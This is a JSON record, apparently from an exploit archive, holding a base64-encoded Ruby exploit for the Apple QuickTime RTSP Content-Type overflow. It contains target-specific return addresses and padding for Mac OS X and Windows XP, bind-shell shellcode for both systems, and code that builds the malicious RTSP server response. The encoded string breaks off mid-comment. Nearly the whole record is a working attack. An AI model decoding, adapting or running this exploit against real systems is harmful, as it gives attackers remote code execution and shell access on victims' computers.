{
    "source": "exploit-database", 
    "exploit": "IyBDb3B5cmlnaHQgKEMpIDIwMDcgU3VicmVwdGlvbiBMTEMuIEFsbCByaWdodHMgcmVzZXJ2ZWQuDQojIFZpc2l0IGh0dHA6Ly9ibG9nLnN1YnJlcHRpb24uY29tIGZvciBleHBsb2l0IGRldmVsb3BtZW50IG5vdGVzLg0KIw0KIyBSZWZlcmVuY2VzOg0KIyAgIGh0dHA6Ly93d3cubWlsdzBybS5jb20vZXhwbG9pdHMvNDY0OCAob3JpZ2luYWwgTWljcm9zb2Z0IFdpbmRvd3MgY29kZSkNCiMgICBodHRwOi8vd3d3Lm1pbHcwcm0uY29tL2V4cGxvaXRzLzQ2NTEgKHJlY2VudCBNaWNyb3NvZnQgV2luZG93cyBleHBsb2l0KQ0KIyAgIEZyb20gTWV0YXNwbG9pdDogYXBwbGVfcXVpY2t0aW1lX3J0c3BfcmVzcG9uc2UucmIgKGJ5IE1DIGFuZCBIRCBNb29yZSkNCiMgICBodHRwOi8vbnZkLm5pc3QuZ292L252ZC5jZm0/Y3ZlbmFtZT1DVkUtMjAwMi0wMjUyDQojICAgQklEOiBodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC8yNjU0OQ0KIw0KIyBOb3RlczoNCiMgICBQYXlsb2FkIGJhZGNoYXJzOiBceDAwIFx4MDkgXHgwYSBceDBkIFx4MjAgXHgyMiBceDI1IFx4MjYgXHgyNyBceDJiIFx4MmYNCiMgICAgICAgICAgICAgICAgICAgICBceDNhIFx4M2MgXHgzZSBceDNmIFx4NDANCiMNCiMgICBUaGUgZXhhbXBsZSBhZGRyZXNzZXMgYW5kIGRhdGEgd2lsbCB0cmlnZ2VyIGFuIElEUyBzaWduYXR1cmUgZWFzaWx5Lg0KIyAgIFJlbW92ZSB0aGVtIGlmIHlvdSdyZSBub3QgdGVzdGluZywgYW5kIGNoYW5nZSBwYWRkaW5nIHNpemVzIGFjY29yZGluZ2x5LiANCiMgICBVc2UgdGhlIFN0cmluZy5yYW5kX2FscGhhKCkgbWV0aG9kIHRvIGdlbmVyYXRlIHJhbmRvbSBzdHJpbmdzLg0KIw0KIyBWZXJzaW9uOiAxLjAgKCtsZW9wYXJkX3BwYyArbGVvcGFyZF94ODYgK3RpZ2VyX3g4NiArdGlnZXJfcHBjICt3aW5feHBzcDIpDQojDQojIFdlIHdvdWxkIGxpa2UgdG8gdGhhbmsuLi4NCiMgICBLZXZpbiBGaW5pc3RlcnJlLCBmb3IgcHJvdmlkaW5nIFBvd2VyUEMgdGVzdGluZyBlbnZpcm9ubWVudCBhbmQgZ2VuZXJhbA0KIyAgIGFpZCBpbiB0aGUgZGV2ZWxvcG1lbnQgYW5kIHByb29maW5nIG9mIHRoaXMgY29kZSBmb3IgTWFjIE9TIFggb24gUFBDLg0KDQojICAgSEQgTW9vcmUgZm9yIGhpcyBzdWdnZXN0aW9ucyBhbmQgTWV0YXNwbG9pdCBjb2RlLg0KIw0KIyBEaXN0cmlidXRlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIFN1YnJlcHRpb24gT3BlbiBTb3VyY2UgTGljZW5zZSB2MS4wDQojIGh0dHA6Ly9zdGF0aWMuc3VicmVwdGlvbi5jb20vcHVibGljL2RvY3VtZW50cy9zdWJyZXB0aW9uLXNvc2wtMS4wLnR4dA0KIw0KDQpyZXF1aXJlICdzb2NrZXQnDQppbmNsdWRlIFNvY2tldDo6Q29uc3RhbnRzDQoNCmRlZiBTdHJpbmcucmFuZF9hbHBoYShzaXplID0gMTYpDQogICgxLi5zaXplKS5jb2xsZWN0IHsgKGkgPSBLZXJuZWwucmFuZCg2Mik7IGkgKz0gKChpIDwgMTApID8gNDggOiAoKGkgPCAzNikgPyA1NSA6IDYxICkpKS5jaHIgfS5qb2luDQplbmQNCg0KbW9kdWxlIE1pc2NVdGlscw0KICBkZWYgc2VsZi5teXB1dHMobXNnKQ0KICAgIHB1dHMgIiN7JDB9OiAje21zZ30iDQogIGVuZA0KICANCiAgIyBGcm9tIE1ldGFzcGxvaXQgUmV4IGxpYnJhcnk6DQogICMgaHR0cDovL21ldGFzcGxvaXQuY29tL3N2bi9mcmFtZXdvcmszL3RydW5rL2xpYi9yZXgvYXJjaC94ODYucmINCiAgZGVmIHNlbGYucmVsX251bWJlcihudW0sIGRlbHRhID0gMCkNCiAgICBzID0gbnVtLnRvX3MNCiAgICBjYXNlIHNbMCwgMl0NCiAgICAgIHdoZW4gJyQrJw0KICAgICAgIG51bSA9IHNbMiAuLiAtMV0udG9faQ0KICAgICAgd2hlbiAnJC0nDQogICAgICAgbnVtID0gLTEgKiBzWzIgLi4gLTFdLnRvX2kNCiAgICAgIHdoZW4gJzB4Jw0KICAgICAgIG51bSA9IHMuaGV4DQogICAgICBlbHNlDQogICAgICAgZGVsdGEgPSAwDQogICAgZW5kDQogICAgcmV0dXJuIG51bSArIGRlbHRhDQogIGVuZA0KZW5kDQoNCiMgbXNmIG9zeC94ODYvc2hlbGxfYmluZF90Y3AgLSA4MSBieXRlcyBwb3J0PTUzNTQgKyBleGl0KCkNCk1TRl9PU1hfWDg2ID0NCiJceDMxXHhjMFx4NTBceDY4XHhmZlx4MDJceDE0XHhlYVx4ODlceGU3XHg1MFx4NmFceDAxXHg2YVx4MDJceDZhIiArDQoiXHgxMFx4YjBceDYxXHhjZFx4ODBceDU3XHg1MFx4NTBceDZhXHg2OFx4NThceGNkXHg4MFx4ODlceDQ3XHhlYyIgKw0KIlx4YjBceDZhXHhjZFx4ODBceGIwXHgxZVx4Y2RceDgwXHg1MFx4NTBceDZhXHg1YVx4NThceGNkXHg4MFx4ZmYiICsNCiJceDRmXHhlNFx4NzlceGY2XHg1MFx4NjhceDJmXHgyZlx4NzNceDY4XHg2OFx4MmZceDYyXHg2OVx4NmVceDg5IiArDQoiXHhlM1x4NTBceDU0XHg1NFx4NTNceDUwXHhiMFx4M2JceGNkXHg4MFx4MzFceGMwXHg1MFx4YjBceDAxXHhjZCIgKw0KIlx4ODAiDQoNCiMgbXNmIHdpbjMyX2JpbmQgLSBFWElURlVOQz1wcm9jZXNzIExQT1JUPTQ0NDQgU2l6ZT02OTYgRW5jb2Rlcj1BbHBoYTINCk1TRl9XSU5fWDg2ID0NCiJceGViXHgwM1x4NTlceGViXHgwNVx4ZThceGY4XHhmZlx4ZmZceGZmXHg0OVx4MzdceDQ5XHg0OVx4NDlceDQ5IiArDQoiXHg0OVx4NDlceDQ5XHg0OVx4NDlceDQ5XHg0OVx4NDlceDQ5XHg0OVx4NDlceDQ5XHg1MVx4NWFceDZhXHg0MiIgKw0KIlx4NThceDUwXHgzMFx4NDJceDMxXHg0MVx4NDJceDZiXHg0Mlx4NDFceDUyXHgzMlx4NDJceDQyXHgzMlx4NDEiICsNCiJceDQxXHgzMFx4NDFceDQxXHg1OFx4NDJceDUwXHgzOFx4NDJceDQyXHg3NVx4MzlceDc5XHg0Ylx4NGNceDYxIiArDQoiXHg3YVx4MzhceDZiXHg1MFx4NGRceDY4XHg2OFx4NjlceDY5XHg0Ylx4NGZceDRiXHg0Zlx4NTlceDZmXHg1MyIgKw0KIlx4NTBceDRlXHg2Ylx4MzJceDRjXHg0NFx4NjRceDM1XHg3NFx4NmVceDZiXHgzMFx4NDVceDU3XHg0Y1x4NGUiICsNCiJceDZiXHg0MVx4NmNceDY0XHg0NVx4NTFceDY4XHg0Nlx4NjFceDRhXHg0Zlx4NmNceDRiXHgzMFx4NGZceDQ2IiArDQoiXHg3OFx4NmNceDRiXHg3MVx4NGZceDQ3XHg1MFx4MzNceDMxXHg1YVx4NGJceDYxXHg1OVx4NmVceDZiXHg1MCIgKw0KIlx4MzRceDRlXHg2Ylx4NDZceDYxXHg3OFx4NmVceDUwXHgzMVx4NjlceDUwXHg0ZVx4NzlceDRlXHg0Y1x4NGIiICsNCiJceDM0XHg2Ylx4NzBceDUyXHg1NFx4NjNceDM3XHgzOFx4NDFceDZhXHg2YVx4NDRceDRkXHg2M1x4MzFceDZiIiArDQoiXHg3Mlx4NjhceDZiXHg0OVx4NjRceDc3XHg0Ylx4MzBceDU0XHg0MVx4MzRceDQ1XHg3OFx4NTJceDU1XHg2OSIgKw0KIlx4NzVceDZlXHg2Ylx4NzNceDZmXHg3NVx4NzRceDU2XHg2MVx4N2FceDRiXHgzM1x4NTZceDRlXHg2Ylx4MzYiICsNCiJceDZjXHg3Mlx4NmJceDRjXHg0Ylx4NTNceDZmXHgzNVx4NGNceDc3XHg3MVx4MzhceDZiXHg0N1x4NzNceDQ0IiArDQoiXHg2Y1x4NmVceDZiXHg0Ylx4MzlceDMyXHg0Y1x4MzVceDc0XHg3N1x4NmNceDY1XHgzMVx4NjlceDUzXHg1NiIgKw0KIlx4NTFceDQ5XHg0Ylx4NjVceDM0XHg0ZVx4NmJceDY3XHgzM1x4MzRceDcwXHg0Y1x4NGJceDc3XHgzMFx4NzQiICsNCiJceDRjXHg2ZVx4NmJceDY0XHgzMFx4NDdceDZjXHg0Y1x4NmRceDZlXHg2Ylx4NDFceDUwXHg2M1x4MzhceDUzIiArDQoiXHg2ZVx4NzBceDY4XHg0ZVx4NmVceDYyXHg2ZVx4NTZceDZlXHgzOFx4NmNceDUyXHg3MFx4NmJceDRmXHg3YSIgKw0KIlx4NzZceDcyXHg0Nlx4NjFceDQzXHg0M1x4NTZceDUyXHg0OFx4NzdceDQzXHg2NFx4NzJceDUxXHg3OFx4NzEiICsNCiJceDY3XHg1MFx4NzNceDcwXHgzMlx4NzFceDRmXHgzMVx4NDRceDRiXHg0Zlx4NGFceDcwXHg3NVx4MzhceDc4IiArDQoiXHg0Ylx4NjhceDZkXHg0OVx4NmNceDc1XHg2Ylx4NDZceDMwXHg0Ylx4NGZceDc5XHg0Nlx4NTNceDZmXHg2ZiIgKw0KIlx4NzlceDM4XHg2NVx4NzNceDU2XHg0Y1x4NDFceDU4XHg2ZFx4NjRceDQ4XHg2NVx4NTJceDcyXHg3NVx4MzIiICsNCiJceDRhXHg3M1x4MzJceDQ5XHg2Zlx4NGFceDcwXHgzM1x4NThceDc4XHg1OVx4NjNceDM5XHgzOVx4NjVceDRjIiArDQoiXHg2ZFx4NzJceDc3XHg2Ylx4NGZceDZlXHgzNlx4NTBceDUzXHg1Mlx4NzNceDUxXHg0M1x4NzBceDUzXHgzMyIgKw0KIlx4NjNceDcxXHg1M1x4NjNceDYzXHg2MVx4NTNceDMzXHg2M1x4NGJceDRmXHg1YVx4NzBceDczXHg1Nlx4NTEiICsNCiJceDc4XHgzN1x4NjFceDQxXHg0Y1x4NTBceDY2XHg1M1x4NjNceDZjXHg0OVx4NWFceDQxXHg1YVx4MzVceDUxIiArDQoiXHg3OFx4NGRceDc0XHg2N1x4NmFceDMwXHg3MFx4NGJceDc3XHg2Nlx4MzdceDc5XHg2Zlx4NGJceDY2XHg0MSIgKw0KIlx4N2FceDMyXHgzMFx4NzJceDcxXHgzM1x4NjVceDU5XHg2Zlx4MzhceDUwXHg3MFx4NjhceDZmXHg1NFx4NmUiICsNCiJceDRkXHg2NFx4NmVceDM4XHg2OVx4MzJceDc3XHg0Ylx4NGZceDRlXHgzNlx4NTFceDQzXHg0MVx4NDVceDM5IiArDQoiXHg2Zlx4NGFceDcwXHg3MVx4NzhceDRhXHg0NVx4NzFceDU5XHg2ZFx4NTZceDQzXHg3OVx4NzZceDM3XHg0YiIgKw0KIlx4NGZceDM5XHg0Nlx4NTJceDcwXHg3Mlx4NzRceDQ2XHgzNFx4MzFceDQ1XHg0Ylx4NGZceDY4XHg1MFx4NGUiICsNCiJceDczXHg0M1x4NThceDZiXHg1N1x4NzFceDY5XHg2Zlx4MzZceDUzXHg0OVx4NzZceDM3XHg2Ylx4NGZceDM4IiArDQoiXHg1Nlx4NzFceDQ1XHg2Ylx4NGZceDQ4XHg1MFx4MzVceDM2XHg3MFx4NmFceDMxXHg3NFx4NDVceDM2XHgzMSIgKw0KIlx4NzhceDYyXHg0M1x4MzJceDRkXHg2Zlx4NzlceDdhXHg0NVx4NzFceDdhXHgzMFx4NTBceDMzXHg2OVx4NDYiICsNCiJceDQ5XHg2YVx4NmNceDZiXHgzOVx4NmFceDQ3XHg3M1x4NWFceDUxXHg1NFx4NmZceDc5XHg2ZFx4MzJceDMwIiArDQoiXHgzMVx4NTlceDUwXHgzOFx4NzNceDRkXHg3YVx4NTlceDZlXHg0M1x4NzJceDM2XHg0ZFx4NjlceDZlXHg3MyIgKw0KIlx4NzJceDU0XHg2Y1x4NmZceDYzXHg0Y1x4NGRceDcyXHg1YVx4NzRceDc4XHg0Y1x4NmJceDZjXHg2Ylx4NmUiICsNCiJceDRiXHgzNVx4MzhceDUwXHg3Mlx4NmJceDRlXHg0Y1x4NzNceDY0XHg1Nlx4NGJceDRmXHg0M1x4NDVceDMyIiArDQoiXHg2NFx4NzlceDZmXHg3YVx4NzZceDMzXHg2Ylx4MzJceDc3XHg2Mlx4NzJceDYzXHg2MVx4MzNceDYxXHgzMCIgKw0KIlx4NTFceDMwXHg2YVx4NTNceDMxXHg3MVx4NDFceDQ2XHgzMVx4NTJceDc1XHgzMlx4NzFceDZiXHg0Zlx4NGUiICsNCiJceDMwXHg3MFx4NjhceDRlXHg0ZFx4N2FceDc5XHg0Nlx4NjVceDRhXHg2ZVx4NzJceDczXHg2OVx4NmZceDU4IiArDQoiXHg1Nlx4NzJceDRhXHg2OVx4NmZceDY5XHg2Zlx4NjZceDU3XHgzOVx4NmZceDU4XHg1MFx4NGNceDRiXHg0MSIgKw0KIlx4NDdceDZiXHg0Y1x4NmNceDQzXHg0Zlx4MzRceDMyXHg0NFx4NGJceDRmXHg2OFx4NTZceDc2XHgzMlx4NGIiICsNCiJceDRmXHg0ZVx4MzBceDcxXHg3OFx4MzNceDRlXHg2YVx4NzhceDQ5XHg3Mlx4NDNceDQzXHg2MVx4NDNceDRiIiArDQoiXHg0Zlx4NDhceDU2XHg2OVx4NmZceDZhXHg3MFx4NDIiDQoNCm1vZHVsZSBBcHBsZU9TWA0KY2xhc3MgUXVpY2t0aW1lUmVkdXgNCiAgVEFSR0VUX01BVFJJWCA9IHsNCiAgICAjIE1hYyBPUyBYIExlb3BhcmQgb24gUG93ZXJQQyAocHBjKQ0KICAgICI3LjMtTWFjIDEwLjUuMS1QUEMiID0+IHsNCiAgICAgICMgU3RhY2sgb24gUFBDIGlzIHN0aWxsIGV4ZWN1dGFibGUNCiAgICAgIDpyZXRfYWRkcmVzcyAgPT4gMHhiZmZmY2IwYys1MCwNCiAgICAgIDpwYWRkaW5nX3NpemUgPT4gNTU5LA0KICAgICAgDQogICAgICAjIFNoZWxsY29kZSB3aWxsIC1saWtlbHktIHJlcXVpcmUgY2hhbmdlcyBoZXJlDQogICAgICA6cHJlcGVuZF9kYXRhID0+ICgNCiAgICAgICAgWzB4ZGVhZDU4NDFdLnBhY2soIk4iKSArICAjIHIyMg0KICAgICAgICBbMHhkZWFkNTg0Ml0ucGFjaygiTiIpICsgICMgcjIzDQogICAgICAgIFsweGRlYWQ0MTQxXS5wYWNrKCJOIikgKyAgIyByMjQNCiAgICAgICAgWzB4ZGVhZDQxNDJdLnBhY2soIk4iKSArICAjIHIyNQ0KICAgICAgICBbMHhkZWFkNDE0M10ucGFjaygiTiIpICsgICMgcjI2DQogICAgICAgIFsweGRlYWQ0MTQ0XS5wYWNrKCJOIikgKyAgIyByMjcNCiAgICAgICAgWzB4ZGVhZDQxNDVdLnBhY2soIk4iKSArICAjIHIyOA0KICAgICAgICBbMHhkZWFkNDE0Nl0ucGFjaygiTiIpICsgICMgcjI5DQogICAgICAgIFsweGRlYWQ0MTQ3XS5wYWNrKCJOIikgKyAgIyByMzANCiAgICAgICAgWzB4ZGVhZDQxNDhdLnBhY2soIk4iKSArICAjIHIzMQ0KICAgICAgICBbMHhkZWFkNDE1MF0ucGFjaygiTiIpICsgICMNCiAgICAgICAgWzB4ZGVhZDQxNTFdLnBhY2soIk4iKSArICAjDQogICAgICAgIFsweGRlYWQ0MTUyXS5wYWNrKCJOIikgKyAgIyBhdCAkc3ArMA0KICAgICAgICBbMHhkZWFkNDE1M10ucGFjaygiTiIpICAgICMgYXQgJHNwKzQNCiAgICAgICksDQogICAgICA6YXBwZW5kX2RhdGEgID0+ICgiIiksDQogICAgICA6c2hlbGxjb2RlICAgID0+ICggIlx4NjkiICogMTIwICkNCiAgICB9LA0KICAgIA0KICAgICMgTWFjIE9TIFggTGVvcGFyZCBvbiBJQTMyICh4ODYpIGJ1aWxkIDlCMTgNCiAgICAiNy4zLU1hYyAxMC41LjEtSUEzMiIgPT4gew0KICAgICAgIyBSZXR1cm4tdG8tZHlsZCBzdHViIGlzIG5vdCByZWxpYWJsZSB1bmxlc3MgdGhlIG1hY2hpbmUNCiAgICAgICMgaGFzbid0IHJhbmRvbWl6ZWQgdGhlIGR5bGQgYmFzZSBhZGRyZXNzLg0KICAgICAgOnJldF9hZGRyZXNzICA9PiAweGRlYWRiZWVmLA0KICAgICAgOnBhZGRpbmdfc2l6ZSA9PiAyOTEsDQogICAgICA6cHJlcGVuZF9kYXRhID0+ICgNCiAgICAgICAgWzB4MTEyMjMzNDRdLnBhY2soIlYiKSAgKyAgICAgICMgZWJ4DQogICAgICAgIFsweDQxNDI0MTQyXS5wYWNrKCJWIikgICsgICAgICAjIGVzaQ0KICAgICAgICBbMHgzMTMzNzY2Nl0ucGFjaygiViIpICArICAgICAgIyBlZGkNCiAgICAgICAgWzB4ZGVmYWNlZGRdLnBhY2soIlYiKSAgICAgICAgICMgZWJwDQogICAgICApLA0KICAgICAgOmFwcGVuZF9kYXRhICA9PiAoDQogICAgICAgIFsweGEwYTdlNDRhXS5wYWNrKCJWIikgICsgICAgICAjIHRvIGR5bGRfc3R1Yl9leGl0DQogICAgICAgIFsweGJmZmZmYWEzXS5wYWNrKCJWIikgICAgICAgICAjIGFkZHJlc3MgdG8gL2Jpbi9iYXNoDQogICAgICApLA0KICAgICAgDQogICAgICA6c2hlbGxjb2RlICAgID0+ICgNCiAgICAgICAgInNjcmVlbmNhcHR1cmUgLVMgfi9EZXNrdG9wL1VTLnBuZzsgZXhpdDsiICsNCiAgICAgICAgKCJceDkwIiAqIDEzMCkgKyBNU0ZfT1NYX1g4Ng0KICAgICAgKQ0KICAgIH0sDQogICAgDQogICAgIyBNYWMgT1MgWCBUaWdlciBvbiBJQTMyICh4ODYpIGJ1aWxkIDhTMjE2NyAoMTAuNC4xMSkNCiAgICAjIEFwcGFyZW50bHksIGl0IGFkdmVydGlzZXMgMTAuNC45IGluc3RlYWQgb2YgMTAuNC4xMQ0KICAgICI3LjMtTWFjIDEwLjQuOS1JQTMyIiA9PiB7DQogICAgICAjIFJldHVybi10by1keWxkIHN0dWIgd29ya3MgcmVsaWFibHkgb24gVGlnZXINCiAgICAgICMgMHhhMGJlMjI4MCBmb3IgZHlsZF9zdHViX3N5c3RlbQ0KICAgICAgOnJldF9hZGRyZXNzICA9PiAweGEwYmUyMjgwLA0KICAgICAgOnBhZGRpbmdfc2l6ZSA9PiAyOTEsDQogICAgICA6cHJlcGVuZF9kYXRhID0+ICgNCiAgICAgICAgWzB4OTE3ZjE0MTNdLnBhY2soIlYiKSAgKyAgICAgICMgZWJ4DQogICAgICAgIFsweGZmZmZlYWU2XS5wYWNrKCJWIikgICsgICAgICAjIGVzaQ0KICAgICAgICBbMHgxNDUzMzA1MF0ucGFjaygiViIpICArICAgICAgIyBlZGkNCiAgICAgICAgWzB4YmZmZmQyN2NdLnBhY2soIlYiKSAgICAgICAgICMgZWJwDQogICAgICApLA0KICAgICAgDQogICAgICAjIGV4aXQoKSBzdHViIGlzIHByb2JsZW1hdGljIHdpdGggc29tZSBhdGV4aXQgY29kZQ0KICAgICAgIyBiZWNhdXNlIG9mIGNvcnJ1cHRlZCBmcmFtZXMsIHdlIHVzZSBhYm9ydCgpIGluc3RlYWQuDQogICAgICAjIEEgL2Jpbi9iYXNoIHN0cmluZyAoZnJvbSBlbnYpIGlzIHVzdWFsbHkgYXQgMHhiZmZmZmMyMw0KICAgICAgIyB3aGVuIHJ1bm5pbmcgdW5kZXIgZ2RiLCBvciAweGJmZmZmZTVjIGlmIHN0YXJ0ZWQNCiAgICAgICMgdmlhIGRvY2suIElmIHN0YXJ0ZWQgZnJvbSBUZXJtaW5hbCwgaXQncyBhdCAweGJmZmZmYzNlLg0KICAgICAgOmFwcGVuZF9kYXRhICA9PiAoDQogICAgICAgIFsweGEwODE1NTg3XS5wYWNrKCJWIikgICsgICAgICAjIHRvIGR5bGRfc3R1Yl9hYm9ydA0KICAgICAgICBbMHhiZmZmZmMzZV0ucGFjaygiViIpICAgICAgICAgIyBhZGRyZXNzIHN5c3RlbSgpIGNvbW1hbmQNCiAgICAgICksDQogICAgICANCiAgICAgICMgTk9QIHNsZWQgKyBNZXRhc3Bsb2l0IHNoZWxsY29kZSArIE5PUCBzbGVkICsgaW50Mw0KICAgICAgOnNoZWxsY29kZSAgICA9PiAoDQogICAgICAgICgiXHg5MCIgKiAxNDApICsgTVNGX09TWF9YODYgKyAoIlx4OTAiICogMzApICsgIlx4Y2MiDQogICAgICApDQogICAgfSwNCiAgICANCiAgICAjIE1hYyBPUyBYIFRpZ2VyIG9uIFBvd2VyUEMgKFBQQykNCiAgICAjIEl0IGFsc28gYWR2ZXJ0aXNlcyAxMC40LjkgaW5zdGVhZCBvZiAxMC40LjExDQogICAgIjcuMy1NYWMgMTAuNC45LVBQQyIgPT4gew0KICAgICAgIyBTdHViIGFkZHJlc3MgZm9yIHN5c3RlbSgpIGNvbnRhaW5zIGEgbnVsbCBieXRlLg0KICAgICAgIyBzeXN0ZW0oKSBhZGRyZXNzIGNvbnRhaW5zIGZpbHRlcmVkIGNoYXIuDQogICAgICA6cmV0X2FkZHJlc3MgID0+IDB4ZGVhZGJlZWYsDQogICAgICA6cGFkZGluZ19zaXplID0+IDU1OSwNCiAgICAgIDpwcmVwZW5kX2RhdGEgPT4gKA0KICAgICAgICBbMHhkZWFkNTg0MV0ucGFjaygiTiIpICsgICMgcjIyDQogICAgICAgIFsweGRlYWQ1ODQyXS5wYWNrKCJOIikgKyAgIyByMjMNCiAgICAgICAgWzB4ZGVhZDQxNDFdLnBhY2soIk4iKSArICAjIHIyNA0KICAgICAgICBbMHhkZWFkNDE0Ml0ucGFjaygiTiIpICsgICMgcjI1DQogICAgICAgIFsweGRlYWQ0MTQzXS5wYWNrKCJOIikgKyAgIyByMjYNCiAgICAgICAgWzB4ZGVhZDQxNDRdLnBhY2soIk4iKSArICAjIHIyNw0KICAgICAgICBbMHhkZWFkNDE0NV0ucGFjaygiTiIpICsgICMgcjI4DQogICAgICAgIFsweGRlYWQ0MTQ2XS5wYWNrKCJOIikgKyAgIyByMjkNCiAgICAgICAgWzB4ZGVhZDQxNDddLnBhY2soIk4iKSArICAjIHIzMA0KICAgICAgICBbMHhkZWFkNDE0OF0ucGFjaygiTiIpICsgICMgcjMxDQogICAgICAgIFN0cmluZy5yYW5kX2FscGhhKDE2KQ0KICAgICAgKSwNCiAgICAgIDphcHBlbmRfZGF0YSAgPT4gKA0KICAgICAgICBbMHg5NDJiY2U4MF0ucGFjaygiTiIpICArICMgdG8gZHlsZF9zdHViX2Fib3J0DQogICAgICAgIFsweDU4NTg1ODU4XS5wYWNrKCJOIikNCiAgICAgICksDQogICAgICA6c2hlbGxjb2RlICAgID0+ICgNCiAgICAgICAgIlx4NjkiICogMTIwDQogICAgICApDQogICAgfSwNCiAgICANCiAgICAjIE1pY3Jvc29mdCBXaW5kb3dzIHRhcmdldHMNCiAgICANCiAgICAjIDcuMyBvbiBYUCBTUDIsIGJhc2VkIG9uIHRoZSBvcmlnaW5hbCBNZXRhc3Bsb2l0IG1vZHVsZSBieSBNQw0KICAgICMgVGhpcyBvbmUgaXMgZWxlZ2FudCBhbmQgcmVsaWFibGUgOikNCiAgICAjICh1c2VzIGFkZHJlc3MgZnJvbSBRdWlja1RpbWVTdHJlYW1pbmcucXR4IHZlcnNpb24gNy4zLjAuNzApDQogICAgIjcuMy1XaW5kb3dzIE5UIDUuMVNlcnZpY2UgUGFjayAyLUlBMzIiID0+IHsNCiAgICAgICMgcG9wIGVzaTsgcG9wIGVieDsgcmV0DQogICAgICA6cmV0X2FkZHJlc3MgID0+IDB4Njc2NDQyOTcsDQogICAgICA6cGFkZGluZ19zaXplID0+IDk5MStNU0ZfV0lOX1g4Ni5zaXplLA0KICAgICAgOnByZXBlbmRfZGF0YSA9PiAoDQogICAgICAgICJceGViIiArIFtNaXNjVXRpbHM6OnJlbF9udW1iZXIoNiwgLTIpXS5wYWNrKCJWIilbMCwxXSArDQogICAgICAgICJceDkwXHg5MCINCiAgICAgICksDQogICAgICA6YXBwZW5kX2RhdGEgID0+ICggU3RyaW5nLnJhbmRfYWxwaGEoNDA5MiAtIE1TRl9XSU5fWDg2LnNpemUpICksDQogICAgICA6c2hlbGxjb2RlICAgID0+IE1TRl9XSU5fWDg2DQogICAgfSwNCiAgICANCiAgICAjIDcuMyBvbiBWaXN0YQ0KICAgICMgV2UgYXJlIG5vdCBpbmNsdWRpbmcgaXQgeWV0LCBmZWVsIGZyZWUgdG8gcGxheSBhcm91bmQNCiAgICAiNy4zLVdpbmRvd3MgTlQgNi4wLUlBMzIiID0+IHsNCiAgICAgIDpyZXRfYWRkcmVzcyAgPT4gMHhkZWFkYmVlZiwNCiAgICAgIDpwYWRkaW5nX3NpemUgPT4gOTkxK01TRl9XSU5fWDg2LnNpemUsDQogICAgICA6cHJlcGVuZF9kYXRhID0+ICgiIiksDQogICAgICA6YXBwZW5kX2RhdGEgID0+ICggU3RyaW5nLnJhbmRfYWxwaGEoNDA5MiAtIE1TRl9XSU5fWDg2LnNpemUpICksDQogICAgICA6c2hlbGxjb2RlICAgID0+IE1TRl9XSU5fWDg2DQogICAgfQ0KICB9DQogIA0KICAjIEdlbmVyYXRlcyBoZWFkZXJzIGZvciBhIFF1aWNrdGltZSBSVFNQIHJlc3BvbnNlLCBhbmQgaW5qZWN0cw0KICAjIHRoZSBwYXlsb2FkIGludG8gdGhlIENvbnRlbnQtVHlwZSBoZWFkZXIgKGluY2x1ZGluZyB0aGUgcGFkZGluZykuDQogIGRlZiBtYWtlX2hlYWRlcihib2R5X2xlbmd0aCwgcGF5bG9hZCkNCiAgICAiUlRTUC8xLjAgMjAwIE9LXHJcbiIgICAgICAgICAgICAgICAgICAgICAgICAgICArDQogICAgIkNTZXE6IDFcclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKw0KICAgICJDb250ZW50LUJhc2U6IHJ0c3A6Ly8wLjAuMC4wLyN7QG1wZmlsZX1cclxuIiAgKw0KICAgICJDb250ZW50LVR5cGU6ICN7cGF5bG9hZH1cclxuIiAgICAgICAgICAgICAgICAgICsNCiAgICAiQ29udGVudC1MZW5ndGg6ICN7Ym9keV9sZW5ndGh9XHJcbiIgICAgICAgICAgICArDQogICAgIlxyXG4iDQogIGVuZA0KICANCiAgIyBHZW5lcmF0ZXMgYSBib2R5IGZvciBhIFF1aWNrdGltZSBSVFNQIHJlc3BvbnNlDQogIGRlZiBtYWtlX2JvZHkNCiAgICByYW5kX3N0ciA9IFN0cmluZy5yYW5kX2FscGhhKHJhbmQoMTApKzEpDQogICAgcmFuZF9uYW0gPSBTdHJpbmcucmFuZF9hbHBoYShyYW5kKDIwKSsxKQ0KICAgICJ2PTBcclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsNCiAgICAibz0tICN7cmFuZCgweGZmZmZmZmZmKX0gMSBJTiBJUDQgMC4wLjAuMFxyXG4iICAgICAgICAgICAgICArDQogICAgInM9TVBFRy0xIG9yIDIgQXVkaW8sIHN0cmVhbWVkIGJ5ICN7cmFuZF9zdHJ9XHJcbiIgICAgICAgICAgKw0KICAgICJpPSN7QG1wZmlsZX1cclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsNCiAgICAidD0wIDBcclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArDQogICAgImE9dG9vbDoje3JhbmRfbmFtfVxyXG4iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKw0KICAgICJhPXR5cGU6YnJvYWRjYXN0XHJcbiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsNCiAgICAiYT1jb250cm9sOipcclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICArDQogICAgImE9cmFuZ2U6bnB0PTAtMjEzLjA3N1xyXG4iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKw0KICAgICJhPXgtcXQtdGV4dC1uYW06TVBFRy0xIG9yIDIgQXVkaW8sIHN0cmVhbWVkIGJ5ICN7cmFuZF9zdHJ9XHJcbiIgICsNCiAgICAiYT14LXF0LXRleHQtaW5mOiN7QG1wZmlsZX1cclxuIiAgICAgICAgICAgICAgICAgICAgICAgICAgICArDQogICAgIm09YXVkaW8gMCBSVFAvQVZQIDE0XHJcbiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKw0KICAgICJjPUlOIElQNCAwLjAuMC4wXHJcbiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsNCiAgICAiYT1jb250cm9sOnRyYWNrMVxyXG4iDQogIGVuZA0KICANCiAgIyBDb25zdHJ1Y3QgYSBwYXlsb2FkIHdpdGhvdXQgZmlsdGVyZWQgY2hhcmFjdGVycywgZm9yIHRoZSB0YXJnZXQgcHJvdmlkZWQuDQogICMgVGhlIGluZm9yb